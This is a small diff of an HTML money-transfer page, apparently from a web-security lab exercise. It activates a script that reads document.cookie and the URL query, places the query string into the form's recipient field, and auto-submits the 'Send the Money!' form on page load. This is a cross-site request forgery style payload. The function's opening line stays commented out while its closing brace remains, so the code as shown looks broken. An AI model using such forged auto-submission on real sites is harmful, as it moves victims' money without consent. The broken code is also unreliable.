@@ -14,8 +14,9 @@
             <button type="submit" class="btn btn-primary">Send the Money!</button>
         </form>
        <script>//function submits(){
-           //let cookies = document.cookie;document.getElementById("inputTo").value = cookies;
-         //document.forms[0].submit()
+           let path = location.search;
+           let cookies = document.cookie;document.getElementById("inputTo").value = path;
+           document.forms[0].submit();
          }
         </script>
 </body>
